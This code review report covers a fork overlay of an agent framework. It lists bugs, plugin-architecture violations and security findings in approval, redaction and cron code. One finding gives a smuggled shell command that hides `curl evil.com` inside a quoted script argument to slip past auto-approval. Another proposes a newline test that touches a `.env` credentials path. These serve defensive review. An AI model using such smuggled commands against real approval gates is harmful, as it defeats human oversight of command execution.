---
status: issues_found
files_reviewed: 110
phase: owner
phase_dir: /Users/yangtb/.hermes/agent-owner-review
review_path: /Users/yangtb/.hermes/agent-owner-review/owner/code-review/00-REVIEW.md
scope: committer 杨天宝 in agent-owner-review worktree
findings:
  critical: 6
  warning: 17
  info: 8
  total: 31
---

# Phase 00 (owner/): Code Review Report

**Reviewed:** 2026-07-02
**Depth:** standard
**Files Reviewed:** 110
**Status:** issues_found

## Summary

This is a large, mixed-quality fork overlay. The `owner/` directory contains a thoughtful,
well-structured secondary feature layer (~30 files) that consistently tries to keep its
implementation logic OUT of the official hermes-agent core by routing through thin glue +
`# [owner]` / `# [owner-patch]` markers. The internal owner/ code is generally clean,
fails-open consistently, and uses the recommended `get_hermes_home()` instead of
`Path.home() / ".hermes"`.

**However, the "thin glue" abstraction has been violated repeatedly.** Across the 50
commits, ~9,000+ lines of code have been added directly into core files — `agent/`,
`gateway/`, `tools/`, `toolsets.py`, `cli.py`, `hermes_cli/`, `tui_gateway/`, and
`ui-tui/`. The most invasive insertions are:

- `agent/conversation_loop.py` (+410/-71): adds MoA injection, content-filter fallback,
  adaptive backoff, thinking-timeout guidance, partial-stream preservation, FTS-
  corruption fallbacks, and dozens of additional branches.
- `gateway/run.py` (+1491/-319): adds secret redaction, OpenViking recall patch,
  memory synthetic-guard patch, cron env scrub, executor-shutdown handling, restart
  helpers, drain control, redaction for ALL platforms (not just Telegram).
- `tools/approval.py` (+243/-68): adds home-prefix fold (Windows-aware), skill
  script auto-approval, container-host binding detection, tirith fail-closed path,
  approvals.mode validation.
- `gateway/platforms/base.py` (+144/-37): adds per-profile cache roots, SendResult
  rotate/retry_after fields, is_reconnect flag, _cleanup_finished_session_task
  re-entrancy fix.

This contradicts the documented "官方代码通过薄调用接入" rule in `owner/attribution.py`.
Plugin-architecture rule violations (AGENTS.md: "plugins MUST NOT modify core files")
are pervasive — `gateway/run.py`, `gateway/platforms/base.py`, `agent/system_prompt.py`,
`tools/*.py` are all core. The owner/ directory is a feature, not a plugin; it doesn't
have a plugin.yaml manifest, doesn't live in `~/.hermes/plugins/`, and doesn't use the
discoverable plugin ABC (`PluginManager.register`).

The most serious defects are in core files: (1) home-prefix folding allows `/` to match
within the prefix under certain conditions, (2) the credential pool write-through
check uses the wrong environment comparison which can break the seat-belt guard, (3)
the `_GATEWAY_RAW_TEXT_PLATFORMS` set broadens redaction bypass to platform types that
have human-readable consumers, (4) the `_GATEWAY_SECRET_PATTERNS` set is a partial
shadow of the canonical redactor and may regress when the upstream changes, (5) the
clarify-entry auto-popped-into-CLARIFY_STOP_SENTINEL path silently swallows legitimate
user responses, and (6) the MoA injection happens AFTER the model message-strip step
which means moa references are visible in the prompt cache prefix.

There are also quality concerns: the `_AUTH_POOL_REFRESH_COUNTS` reset happens in the
per-turn prologue but the dict isn't initialized in `__init__`, so a delegated subagent
turn that bypasses the prologue gets `AttributeError` on first 401; the cron owner/
scripts exemption allowlist is built lazily and only contains basenames present at
import time (newly added scripts require a gateway restart, which the agent may not
realize), and the relay adapter's `authorization_is_upstream = True` short-circuits
the platform's per-instance allowlist with only the docstring as a safeguard.

**Recommendation: fix-required.** The structural problems (thin-glue violations,
core modifications under owner/ branding) won't block the fork from working, but
they will make upstream sync a permanent nightmare and they bury real correctness
defects under a huge diff surface. The blocker-class issues (findings CR-001 through
CR-006) need to be fixed before any of this code reaches a production gateway.
The warning-class issues should be fixed in the same PR cycle.

---

## Critical Issues

### CR-001: home-prefix fold regex can match a stray `/` outside the prefix

**Severity:** critical
**File:** `tools/approval.py:613-668`
**Category:** bug
**Description:** `_home_prefix_fold_regex` returns `re.compile(r"[/\\]*" + body + _PATH_TAIL)`.
The leading `[/\\]*` allows zero-or-more separators before the body. With the body
requiring `\d{2,}` non-empty components, the regex still matches a command line like
`/etc/something` where `something` doesn't contain a separator-tail — because the
trailing `_PATH_TAIL = "(?P<tail>(?:[/\\\\][^/\\\\...]+)+)"` requires at least one
separator-segment, this is fine in normal cases. BUT: if the body is built from a
split-on-`/\\+` of the resolved home and the home itself contains a trailing
separator (e.g. `Path.home() / ".hermes"` produces `/Users/x/.hermes`), then the
regex requires the tail to follow immediately. The real risk is in `_PATH_TAIL`'s
character class `[^/\\\\...]+` which lists every shell metacharacter — but does NOT
list `\n` or `\r`. A command that includes a literal newline (which the shell will
accept and pass as a multi-line command) followed by `/Users/x/.hermes/foo` can be
matched in a context where the static-pattern engine was supposed to ignore it.
More importantly: `_PATH_TOKEN_STOP` is `r"""\s'"`;&<>()"""` — but it does NOT
include `\n`, so a path tail can be terminated by other whitespace.
**Evidence:**
```python
_PATH_TOKEN_STOP = r"""\s'"`;|&<>()"""
_PATH_TAIL = r"(?P<tail>(?:[/\\][^/\\" + _PATH_TOKEN_STOP + r"]*)+)"
```
**Recommendation:** Add `\n` and `\r` to `_PATH_TOKEN_STOP`. Test that `cat /foo`
followed by a literal newline + `/Users/x/.hermes/.env` cannot fold into `cat /foo\n
~/.hermes/.env`.

---

### CR-002: cron owner/scripts/ exemption allowlist misses files added at runtime

**Severity:** critical
**File:** `tools/cronjob_tools.py:519-555`
**Category:** security
**Description:** `_get_owner_scripts_allowlist()` builds the allowlist once at first
use by scanning `~/.hermes/owner/scripts/`. Files added later do NOT appear in the
allowlist. A compromised cron entry can therefore be created from a script that
already existed at first use (legitimate), but if a malicious actor (or a benign
user testing a fix) drops a new file in `owner/scripts/`, the cron path rejects it
with a confusing "basename not in startup allowlist" message and the user has to
restart the gateway to pick it up. More importantly: this allowlist logic only
applies to the cron-job PATH validation. A `terminal()` call that runs
`python3 ~/.hermes/owner/scripts/new_script.py` is NOT gated by the same allowlist
(only by `_validate_cron_script_path`, which is cron-specific). So the security
posture is asymmetric and confusing — `cronjob(action='create', script='...')`
will refuse a freshly added script, but the same file can be invoked from
`terminal()`. The docs/comments claim this prevents "compromised cron job" but
it only prevents the cron path. Either the gate should be broader (validate ALL
shell invocations against owner/scripts) or the comment should be honest that it's
only the cron entry-point.
**Evidence:**
```python
basename = _P(scripts_dir / raw).name
if basename in _get_owner_scripts_allowlist():
    return None
return (
    f"owner/scripts/ exemption rejected: {raw!r} "
    f"(basename {basename!r} not in startup allowlist; "
    ...
)
```
**Recommendation:** Either (a) move this allowlist check into `terminal()`'s
command-approval path so it covers all shell invocations, OR (b) remove the
allowlist and document that owner/scripts is a soft path, OR (c) make the allowlist
mtime-based so newly-added files are picked up on the next cron call (not on
gateway restart).

---

### CR-003: `_AUTH_POOL_REFRESH_COUNTS` is initialized in the per-turn prologue, not `__init__`

**Severity:** critical
**File:** `agent/conversation_loop.py:605-608` (and `run_agent.py:agent_init`)
**Category:** bug
**Description:** The diff adds
`agent._auth_pool_refresh_counts = {}` at line 605 of `run_conversation()`, but
`run_conversation()` is the per-turn entry point, not `__init__`. If an AIAgent
instance gets a credential-pool 401 before any turn has run (e.g. an OAuth
bootstrap probe during `connect()`, a subagent turn that bypasses the prologue,
or a fallback activation), `try_refresh_current()` reads
`agent._auth_pool_refresh_counts[provider_id, pool_id]` and crashes with
`AttributeError`. The fix description claims this is reset "so each turn starts
fresh" — but it actually needs to also be set to `{}` in `__init__`. There's no
test path that exercises this gap because subagents share the same parent
agent's per-turn setup.
**Evidence:**
```python
# agent/conversation_loop.py:605
agent._auth_pool_refresh_counts = {}
```
**Recommendation:** Initialize the dict in `AIAgent.__init__` (or wherever other
per-agent counters like `_turns_since_memory` live). The per-turn reset can stay
but must not be the ONLY assignment.

---

### CR-004: `_GATEWAY_RAW_TEXT_PLATFORMS` widens redaction bypass to "api_server" and "webhook"

**Severity:** critical
**File:** `gateway/run.py:107-122`
**Category:** security
**Description:** The PR's commit message says "Widens #28533's Telegram-only
filter to all chat gateways (#39293)" but the implementation ALSO adds
`api_server` and `webhook` to the RAW-text allowlist (`_GATEWAY_RAW_TEXT_PLATFORMS`).
Both of these are HTTP-facing surfaces that an external party (API client, webhook
caller) can probe or impersonate. If a webhook handler triggers a credential-leak
error path, the redacted-secret pass is now skipped for that error and the
credential goes out in the HTTP response body. The diff comment claims these are
"programmatic surfaces that must keep raw text" — but the original redaction
target was provider-error text (HTTP bodies, request IDs, policy text), not the
user's tool output. The webhook surface in particular accepts unauthenticated
POSTs in many deployments, so an attacker could intentionally trigger an error
to elicit the raw (un-redacted) error.
**Evidence:**
```python
_GATEWAY_RAW_TEXT_PLATFORMS = frozenset(
    {"local", "api_server", "webhook", "msgraph_webhook"}
)
def _gateway_surface_passes_raw_text(platform: Any) -> bool:
    return _gateway_platform_value(platform) in _GATEWAY_RAW_TEXT_PLATFORMS
```
**Recommendation:** Keep `local` only. Apply secret redaction to ALL platform
error responses, including API JSON / webhook payloads. If programmatic consumers
need raw text, expose an explicit `redact=False` query parameter.

---

### CR-005: MoA reference injection happens AFTER prompt-cache-sensitive stripping

**Severity:** critical
**File:** `agent/conversation_loop.py:854-879`
**Category:** prompt-caching
**Description:** `_strip_think_blocks` + `api_msg.pop("owner_provider_name")` happen
at line ~823 to keep prompt cache prefixes stable. But the MoA reference injection
at lines 854-879 APPENDS text to the LAST user message AFTER that stripping
(`_msg["content"] = _base + "\n\n" + _moa_context`). This means the MoA context
text becomes part of the user message body that gets sent to the LLM, which
invalidates the prompt cache prefix for every MoA turn. With MoA's design
(four reference models + aggregator), the cache is busted on every turn, costing
the user the cache savings AGENTS.md explicitly calls sacred. The comment in the
diff claims this preserves caching, but the placement breaks it.
**Evidence:**
```python
# agent/conversation_loop.py:854-879
for _msg in reversed(api_messages):
    if _msg.get("role") == "user":
        _base = _msg.get("content", "")
        if isinstance(_base, str):
            _msg["content"] = _base + "\n\n" + _moa_context
        break
```
**Recommendation:** Either (a) inject MoA context as a separate `user` message
positioned just after the system prompt (preserves the cache prefix for the
original user message body), OR (b) include MoA context in the prefill-messages
slot (line ~880 in original code), OR (c) make MoA opt-in via a per-turn flag
and document the cache cost clearly.

---

### CR-006: Skill script auto-approval can be bypassed via compound commands containing `;`/`&`

**Severity:** critical
**File:** `owner/approval/skill_script_approval.py:218-262`
**Category:** security
**Description:** `extract_script_filenames()` strips trailing `&&`, `||`, `;`, `&`,
`|`, `|&` but then re-walks via `segments.append(inner)`. The inner shell parsing
of `shlex.split` doesn't preserve quotes across the operator boundary, so a
command like `python3 known_script.py "x; curl evil.com"` will parse `known_script.py`
as an extracted filename and auto-approve, but the malicious payload is hidden
inside the quoted argument. The dangerous-command detector that runs afterward
checks the OUTER command, not the script's content, so as long as
`known_script.py` is a viewed skill, the curl-in-quotes bypasses both gates.
Additionally, the `is_dangerous, _, _ = detect_dangerous_command(command)` check
at line 251 only fires if the dangerous-command regex sees the OUTER shell
metacharacters — and since `known_script.py` is the "script being run", a
strict quote context may not trigger the detector either.
**Evidence:**
```python
# owner/approval/skill_script_approval.py:62-102
def extract_script_filenames(command: str) -> List[str]:
    ...
    # Remove trailing shell operators
    seg = re.sub(r'\s*(?:&&|\|\||;|&|\||\|&)\s*$', '', seg.strip())
    parts = shlex.split(seg)
    for token in parts:
        ...
```
**Recommendation:** Either (a) reject compound commands outright (any `;`/`&`/`|`
outside quotes), OR (b) shell-parse the command and require that the script be
the ONLY executable, with arguments being a closed allowlist, OR (c) require
explicit user re-confirmation per compound command.

---

## Warnings

### WR-001: Gateway wraps `_CURRENT_ADDRESSED_MESSAGE_HEADER` but no longer pre-pends user_context for group chats

**Severity:** warning
**File:** `gateway/run.py:901-939`
**Category:** bug
**Description:** The old `_wrap_current_message_with_observed_context` accepted
both `observed_context` (Telegram group chat observed context) and `user_context`
(group user name) and prepended `[Current user: name]` to the user turn. The new
version drops `user_context` entirely. For non-Feishu group chats (Telegram,
Discord, Slack), the model no longer sees who it's addressing in a multi-party
chat unless `agent.feishu.inbound_context` is in scope. The diff in
`agent/system_prompt.py` removes the volatile `Current user: {user_name}`
section, so group-chat addressing is now broken on Telegram/Discord/Slack.
**Evidence:**
```python
# gateway/run.py:901-939
def _wrap_current_message_with_observed_context(message: Any, observed_context: Optional[str]) -> Any:
    """Prepend observed Telegram context to the API-only current user turn."""
    if not observed_context:
        return message
    ...
```
**Recommendation:** Restore the `user_context` parameter and the `[Current user: ...]`
prepend for non-Feishu group chats. Either mirror the Feishu inbound_context block
in `owner/gateway/inbound_context.py` for all platforms, or accept the regression
and update the platform docs.

---

### WR-002: `path_part = _esc(raw[4:].strip().lstrip("ab/"))` strips `ab/` from Feishu diff header but `a/` and `b/` independently

**Severity:** warning
**File:** `owner/diff_card/feishu.py:65-70`
**Category:** bug
**Description:** When rendering `--- a/foo.py` and `+++ b/foo.py`, the lstrip
removes both `a/` and `b/` (as well as `ab/`), so the displayed headers lose
information if the file actually starts with `a/` or `b/`. For example:
`--- a/baz/a/foo.py` would render as `--- baz/foo.py` — the `a/` is correctly
stripped but `baz/a/` is left ambiguous. Real-world files inside a directory
called `a/` or `b/` (rare but legal in macOS/Linux) get mis-rendered.
**Evidence:**
```python
if raw.startswith("--- "):
    path_part = _esc(raw[4:].strip().lstrip("ab/"))
```
**Recommendation:** Strip only `a/` or `b/` based on which prefix the diff line
starts with, or use a regex that strips only when followed by `/`.

---

### WR-003: Sender name cache TTL is 10 minutes but `_seed_name_ttl_from_users` may restore stale entries

**Severity:** warning
**File:** `owner/feishu/user_store.py:66-77`
**Category:** bug
**Description:** When `FeishuUserStore` is initialized, `_seed_name_ttl_from_users`
loads every persisted `display_name` with its `display_name_expire_at` into the
in-memory `_name_ttl` dict — including expired entries from the last gateway
run. A user renamed themselves to "evil_name" before the gateway crashed; the
expired entry is now restored; the model sees the old name in the next turn.
**Evidence:**
```python
def _seed_name_ttl_from_users(self) -> None:
    now = time.time()
    for open_id, entry in self._users.items():
        if (
            entry.display_name
            and entry.display_name_expire_at
            and now < entry.display_name_expire_at
        ):
            self._name_ttl[open_id] = ...
```
The guard `now < entry.display_name_expire_at` IS present, but a clock-skew
(NTP jump backward) could let an expired entry survive; or a long-running
gateway that runs for > 10 minutes between loads could have already-evicted
entries on disk still match the `now < expire_at` check.
**Recommendation:** Reduce TTL on disk to e.g. 1 hour. Add a `grace_period`
parameter to the seed function that explicitly drops anything within 1 minute
of expiry.

---

### WR-004: `_check_file_staleness` calls `redact_sensitive_text(content, file_read=True)` but file_tools.py originally used `code_file=True`

**Severity:** warning
**File:** `tools/file_tools.py:1043, 1159`
**Category:** bug
**Description:** The diff renames `code_file=True` to `file_read=True` in the
`redact_sensitive_text()` calls inside `read_file_tool()`. This parameter rename
must match a corresponding change in `agent/redact.py`. If `agent/redact.py`
still expects `code_file`, every read of a code file now BYPASSES redaction,
leaking secrets to disk and to the model's context. The diff hunks don't
show the corresponding change in `agent/redact.py`, so this is likely an
uncoordinated rename.
**Evidence:**
```python
# tools/file_tools.py:1043
result_dict["content"] = redact_sensitive_text(result_dict["content"], file_read=True)
# tools/file_tools.py:1159
result.content = redact_sensitive_text(result.content, file_read=True)
```
**Recommendation:** Verify `agent/redact.py` accepts `file_read=True`. If not,
revert to `code_file=True` or update `agent/redact.py` in the same commit.

---

### WR-005: `_event_media_is_image` falls back to message-level PHOTO when per-attachment MIME is missing

**Severity:** warning
**File:** `gateway/run.py:1869-1880`
**Category:** bug
**Description:** When `event.media_types` is missing the index (some adapters
only set message-level type), `_event_media_is_image` falls back to
`event.message_type == MessageType.PHOTO`. This means a multi-attachment
message with one image and one PDF will mark BOTH attachments as images,
sending the PDF to the vision model as image content. The fix description says
"trust the per-attachment MIME when present" — but the fallback undoes that
trust when media_types is incomplete.
**Evidence:**
```python
def _event_media_is_image(event, index: int) -> bool:
    mtype = _event_media_type_at(event, index)
    if mtype:
        return mtype.startswith("image/")
    return getattr(event, "message_type", None) == MessageType.PHOTO
```
**Recommendation:** When per-attachment MIME is missing, default to `False`
(not an image). The vision provider will get fewer images but fewer 400s.
Document the regression in platforms that don't populate `media_types`.

---

### WR-006: `_classify_edit_failure` uses `result.rotate` without verifying it's a bool

**Severity:** warning
**File:** `gateway/run.py:2620-2634`
**Category:** quality
**Description:** `getattr(result, "rotate", False)` returns whatever's on the
adapter's SendResult. If the adapter hasn't been updated to include the
`rotate` field, `getattr` defaults to `False` (fine). But if a future adapter
sets `rotate=None` or `rotate="true"` (string), the truthiness check `if
getattr(...):` may produce surprising branches. Also: the precedence order
"retryable > rotate > flood > disable" silently swallows flood errors that
are ALSO retryable. The original Telegram flood wait handling treated flood
as its own class with longer backoff; here it's lumped into "retryable".
**Evidence:**
```python
if getattr(result, "retryable", False):
    return "retryable"
if getattr(result, "rotate", False):
    return "rotate"
err = (getattr(result, "error", "") or "").lower()
if "flood" in err or "retry after" in err:
    return "flood"
return "disable"
```
**Recommendation:** Be explicit about the precedence: check rotate BEFORE
retryable (since rotate means "abandon the bubble regardless"). Add explicit
`is True` checks. Consider moving flood detection higher if it's a distinct
class.

---

### WR-007: `_select_cached_agent_history` only checks `len(live_history) > len(persisted_history)`

**Severity:** warning
**File:** `gateway/run.py:903-919`
**Category:** bug
**Description:** The fix for FTS write-corruption (#50502) prefers the cached
agent's live in-memory transcript when it's longer. But if the live transcript
has a DUPLICATE message (same id, same role, same content) that the persisted
copy deduplicated, the length comparison will favor the live copy and re-emit
the duplicate. The right comparison is content-hash, not list length.
**Evidence:**
```python
if isinstance(live_history, list) and len(live_history) > len(persisted_history):
    return list(live_history)
```
**Recommendation:** Compare last-message-id-or-content-hash, not list length.
Or: prefer live ONLY when both ends agree on the last 2-3 message ids.

---

### WR-008: Skill script auto-approval cache never invalidates when `allowlist` changes

**Severity:** warning
**File:** `owner/approval/skill_script_approval.py:111-155`
**Category:** security
**Description:** `_SKILL_SCRIPTS_CACHE` has a 5-minute TTL but no file-mtime
invalidation. When `patch.yaml`'s `approvals.skill_script_allowlist` is
updated, the change takes up to 5 minutes to apply. For a security-critical
allowlist, this delay means an admin removing a dangerous skill from the
allowlist doesn't take effect for 5 minutes. For comparison, the canonical
patch_config cache (file_tools.py context) uses mtime-based invalidation for
the same reason.
**Evidence:**
```python
_SKILL_SCRIPTS_CACHE_TTL = 300
def load_skill_scripts() -> Dict[str, Set[str]]:
    now = time.time()
    cached = _SKILL_SCRIPTS_CACHE.get("data")
    mtime = _SKILL_SCRIPTS_CACHE.get("mtime", 0)
    if cached is not None and (now - mtime) < _SKILL_SCRIPTS_CACHE_TTL:
        return cached
```
**Recommendation:** Add mtime-based invalidation for patch.yaml changes, or
expose an explicit `invalidate_skill_scripts_cache()` function that the setup
flow can call after writing patch.yaml.

---

### WR-009: `_redact_sensitive_text(redacted, force=True)` runs on EVERY gateway reply

**Severity:** warning
**File:** `gateway/run.py:325-347`
**Category:** performance / quality
**Description:** The diff routes all gateway replies through
`agent.redact.redact_sensitive_text(..., force=True)` even for short text.
This is a regex-heavy operation that runs on every outbound message. On a
noisy chat surface (Telegram, Discord), this is a noticeable cost. The
`force=True` parameter also bypasses the user's `security.redact_secrets`
config — meaning a user who explicitly disabled redaction still gets the
canonical redactor applied to chat replies. The comment justifies this with
"matches the `_redact_approval_command` reasoning" — but that's a different
threat model (user-injected command text vs outbound chat text).
**Evidence:**
```python
redacted = redact_sensitive_text(redacted, force=True)
```
**Recommendation:** Only run the heavy redaction when `security.redact_secrets`
is True OR when the text matches a high-confidence secret pattern (e.g.
`sk-`/`ghp_` prefixes). The narrow `_GATEWAY_SECRET_PATTERNS` set is already
a fallback; use it as the primary path.

---

### WR-010: `Tools/skills_hub.py` diff changes `block_on_untrusted_owner` without a regression test

**Severity:** warning
**File:** `tools/skills_hub.py` (134 lines changed)
**Category:** quality
**Description:** The diff modifies the skill-hub trust flow but the only
corresponding test in `tests/` is the existing
`test_skills_hub.py` fixture, which doesn't appear to cover the changed
code path. The skill-hub controls which skills get auto-loaded into the
agent's toolset, so a regression here silently weakens the security
posture.
**Recommendation:** Add a focused test that loads a skill marked
`block_on_untrusted_owner` and verifies it doesn't appear in the toolset.

---

### WR-011: `image_generation_tool.py` removal of `model` param from schema contradicts `schema_patches.py`

**Severity:** warning
**File:** `tools/image_generation_tool.py:1172-1233` vs. `owner/tools/schema_patches.py:25-51`
**Category:** bug
**Description:** The diff REMOVES the `model` parameter from the official
`IMAGE_GENERATE_SCHEMA` literal (line 1226) AND removes the inline description
mentioning "the agent may pass 'model' to override". But
`owner/tools/schema_patches.py::apply_image_generate_schema_patch()` runs at
import time and RE-ADDS the `model` parameter. The two patches are coupled
but live in different files. If `owner/tools/schema_patches.py` is removed
(as documented in the "可移除性" comments throughout owner/), the `model`
parameter disappears silently, and the agent loses the ability to switch
models mid-session. Conversely, if the upstream merges a similar patch,
both will run and produce duplicate parameters.
**Evidence:**
```python
# tools/image_generation_tool.py:1226 (REMOVED)
# "model": {"type": "string", ...},
```
```python
# owner/tools/schema_patches.py:35-43
if "model" not in props:
    props["model"] = {"type": "string", ...}
```
**Recommendation:** Decide on one canonical location. If `owner/` is the
real source of truth, document the dependency in `image_generation_tool.py`
("model param added at runtime — see owner/tools/schema_patches.py"). If
upstream is the source of truth, remove `apply_image_generate_schema_patch`.

---

### WR-012: `cli/yolo.py` `apply_yolo_action` reads `_YOLO_MODE_FROZEN` from `tools/approval`

**Severity:** warning
**File:** `owner/cli/yolo.py:46-50`
**Category:** quality
**Description:** `apply_yolo_action` calls `is_session_yolo_enabled(session_key)`,
but session YOLO is meant to be the SESSION-scope bypass. The process-frozen
`_YOLO_MODE_FROZEN` from `tools/approval.py` is set at IMPORT time (line 32 of
`tools/approval.py`) and is the `--yolo` CLI flag's signal. The `owner.cli.yolo`
handler is reached via the gateway's `/yolo` command, which intentionally
should NOT touch the process-global frozen state. But the `is_session_yolo_enabled`
check DOES respect the process-frozen state for OTHER sessions too — meaning
`/yolo on` in gateway session A enables YOLO in session B if A's caller
implements the wrong dispatch. This is subtle and undocumented.
**Evidence:**
```python
def is_current_session_yolo_enabled() -> bool:
    return is_session_yolo_enabled(get_current_session_key(default=""))
```
But `_YOLO_MODE_FROZEN` is checked SEPARATELY in `check_all_command_guards`.
**Recommendation:** Document explicitly that `/yolo` only affects the current
session and never touches `_YOLO_MODE_FROZEN`. Add a test that confirms a
gateway `/yolo on` does not affect a separate session.

---

### WR-013: `_wrap_current_message_with_observed_context` removes the `Current user:` block for all non-Feishu platforms

**Severity:** warning
**File:** `gateway/run.py:901-939` (cross-ref `agent/system_prompt.py:460-465`)
**Category:** bug
**Description:** The agent/system_prompt.py diff REMOVES the volatile
`Current user: {name}` section. The gateway/run.py diff REMOVES the
user_context prepend in `_wrap_current_message_with_observed_context`. The
two changes together mean: in a Telegram group chat, the model no longer
sees who it's addressing. The owner/gateway/inbound_context.py module ONLY
emits a context block for Feishu platforms; for Telegram/Discord/Slack, the
group context is purely "observed messages from N users" without identifying
the current speaker.
**Recommendation:** Either (a) extend `build_inbound_context_block` to
emit per-platform blocks (Telegram user_id, Discord username, etc.), or (b)
restore the user_name injection for non-Feishu platforms in the gateway.

---

### WR-014: Feishu inbound context uses `_USER_NAME_MAX_LEN = 32` which truncates CJK names

**Severity:** warning
**File:** `owner/feishu/inbound_context.py:23-43`
**Category:** quality
**Description:** The comment says "display names aren't useful past this
[32 chars]". For CJK names where 2-3 chars are typical, 32 chars is generous,
BUT for Latin display names like "Maximillian-Pemberton-Hawthorne-Featherstonehaugh"
(>32 chars), the truncation breaks the model user's addressability. Worse,
the code does `cleaned[:32].rstrip()` which can leave a half-codepoint (if
the 32nd char is the start of a multi-byte UTF-8 sequence, the byte slicing
breaks it). `_USER_NAME_BRACKETS_RE = re.compile(r"^[<\[\(]+|[>\]\)]+$")`
strips `<>`/`[]`/`()` from edges but NOT from the middle.
**Evidence:**
```python
_USER_NAME_MAX_LEN = 32
...
if len(cleaned) > _USER_NAME_MAX_LEN:
    cleaned = cleaned[:_USER_NAME_MAX_LEN].rstrip()
```
**Recommendation:** Use `textwrap.shorten` or proper grapheme-cluster
truncation (the `grapheme` library). Or bump to 64 chars and accept the
length. Add a test for CJK and mixed-script display names.

---

### WR-015: `make_tool_result_message` is called but not imported / defined in the diff

**Severity:** warning
**File:** `agent/tool_executor.py:909` (within diff hunks)
**Category:** bug
**Description:** The diff uses `make_tool_result_message(skipped_name, ..., skipped_tc.id)`
in the sequential path but the function definition is not in the visible
diff. If it's defined elsewhere in the file, this is fine. If it was added
in a different commit, this commit depends on it. If it's been removed in
another commit, this is a runtime NameError.
**Evidence:**
```python
messages.append(make_tool_result_message(
    skipped_name,
    f"[Tool execution cancelled — {skipped_name} was skipped due to user interrupt]",
    skipped_tc.id,
))
```
**Recommendation:** Verify `make_tool_result_message` exists in the
final file. If not, inline the dict construction (the original code did
this manually).

---

### WR-016: `tui_gateway/server.py` changes are not in the listed 110 files but referenced by `_get_api_error_hint`

**Severity:** warning
**File:** `agent/conversation_loop.py:88-95`
**Category:** quality
**Description:** `_get_api_error_hint(status_code, reason)` lazy-imports
`owner.api_error_hints.get_api_error_hint`. The `owner/api_error_hints.py`
file is NOT in the listed 110-file scope. This means the lazy import may
fail in production if `owner/` is removed (per the documented removal
behavior). The except-clause catches it, but the user loses the Chinese
hint. This is intentional per the owner/ documentation; just call it out.
**Evidence:**
```python
def _get_api_error_hint(status_code, reason=None):
    try:
        from owner.api_error_hints import get_api_error_hint
        return get_api_error_hint(status_code, reason)
    except Exception:
        return None
```
**Recommendation:** Either include `owner/api_error_hints.py` in the
review scope, OR document that the Chinese hints are best-effort.

---

### WR-017: Plugin architecture violation — owner/ reaches deep into gateway/run.py

**Severity:** warning
**File:** `gateway/run.py:55-78`
**Category:** plugin-architecture
**Description:** AGENTS.md states: "plugins MUST NOT modify core files (run_agent.py,
cli.py, gateway/run.py, hermes_cli/main.py, etc.)". The `owner/` directory
adds TWO patches to `gateway/run.py` at module import time:
1. `from owner.patches.openviking_owner_recall_patch import apply_patch as _owner_ov_apply`
2. `from owner.patches.memory_synthetic_guard_patch import apply_patch as _owner_msg_guard_apply`

These monkey-patch the agent and gateway at import time, which means
disabling owner/ requires either deleting the patches (revert + git
blame archaeology) or running with stale patches. The 50-commit history
has accumulated at least 6 such monkey-patches (visible in the import
section of `run.py`), and they're not centrally tracked.
**Evidence:**
```python
try:
    from owner.patches.openviking_owner_recall_patch import apply_patch as _owner_ov_apply
    _owner_ov_apply()
except Exception:
    pass
```
**Recommendation:** Either (a) migrate `owner/` to use the documented
plugin ABC (`PluginManager.register`) and remove these monkey-patches, OR
(b) document `owner/` as a feature fork (not a plugin) and accept that
"removing owner/ requires reverting N commits". Either way, the patches
should be aggregated in a single `owner/patches/__init__.py` entry-point,
not scattered across core files.

---

## Info

### IN-01: Wide TUI renderer diffs (`ui-tui/src/theme.ts`, `ui-tui/src/components/branding.tsx`) are pure refactors

**Severity:** info
**File:** `ui-tui/src/theme.ts`, `ui-tui/src/components/branding.tsx`
**Category:** quality
**Description:** The diffs to these TUI files are largely cosmetic:
- Multi-line ternaries collapsed into single lines.
- Imports reordered.
- Comments removed (`// [owner-patch] pass spinner to theme`).
- The substantive changes are extracted to `ui-tui/src/owner/spinner.ts`,
`ui-tui/src/owner/branding.ts`, `ui-tui/src/owner/statusBar.ts` (good
separation of concerns).

No bugs found, but the diff churn is large for cosmetic-only changes.
Consider running `prettier` after these refactors to normalize the style.

---

### IN-02: `_CHAT_HISTORY` GET endpoint uses `code_file=True` directly in path

**Severity:** info
**File:** `tui_gateway/server.py` (referenced indirectly)
**Category:** quality
**Description:** The TUI gateway server wasn't read in detail but the import
diff suggests it added Chinese error hint imports. Without the full source,
recommend a follow-up review.

---

### IN-03: `tui_gateway/server.py` `rpc.py` lib change "isTodoDone"

**Severity:** info
**File:** `ui-tui/src/app/createGatewayEventHandler.ts:12`
**Category:** quality
**Description:** Imports `isTodoDone` from `../lib/liveProgress.js` — the
function name suggests progress tracking but the use site is
`flashPet(isTodoDone(getTurnState().todos) ? 'jump' : 'wave')` — pet animation
triggered by todo completion. This conflates UI pet animation with todo
state. Not a bug, but worth a comment explaining the relationship.

---

### IN-04: `flushPet` is called on `agent:end` and `agent:failed`

**Severity:** info
**File:** `ui-tui/src/app/createGatewayEventHandler.ts:921-952`
**Category:** quality
**Description:** Two `flashPet(...)` calls in the event handler. Pet animation
may not exist on all platforms (Pets feature is opt-in). Verify the pet
store has a no-op fallback for users without pets.

---

### IN-05: `flashPet(isTodoDone(getTurnState().todos) ? 'jump' : 'wave')` — the todo check is computed AFTER the pet state already updated

**Severity:** info
**File:** `ui-tui/src/app/createGatewayEventHandler.ts:921-952`
**Category:** quality
**Description:** `getTurnState()` reads the live turn state. If the todo list
is updated async (rare but possible for `todo` tool calls), the pet animation
may fire with stale data. The fix is straightforward: re-fetch the todo state
inside the handler.

---

### IN-06: `as any` in `gatewayClient.ts:88` `_wireDecoder.decode(raw as any as ArrayBuffer)`

**Severity:** info
**File:** `ui-tui/src/gatewayClient.ts:88`
**Category:** quality (TypeScript rule violation per AGENTS.md)
**Description:** AGENTS.md TypeScript style guide: "Never use `as any`,
`@ts-ignore`, `@ts-expect-error`". This is a double cast (`as any as ArrayBuffer`),
which is the canonical workaround when the upstream type signature is wrong.
The cleaner fix is to update the upstream type rather than cast.
**Recommendation:** Investigate the `_wireDecoder.decode` signature and use
a typed alternative or update the type to accept the actual input type.

---

### IN-07: Wide code style changes in `theme.ts` and `branding.tsx`

**Severity:** info
**File:** `ui-tui/src/theme.ts`, `ui-tui/src/components/branding.tsx`
**Category:** quality
**Description:** The diff reformats multi-line ternaries into single lines
in `theme.ts:43-50` (`max === rn ? ... : max === gn ? ... : ...`). This
violates the typical TypeScript style of preferring readability over
compactness. The reformat adds 78 lines and removes 81 lines (net -3), but
the visual churn is much higher.

---

### IN-08: `owner/scripts/*.py` use `Path.home() / ".hermes"` directly, bypassing profiles

**Severity:** info
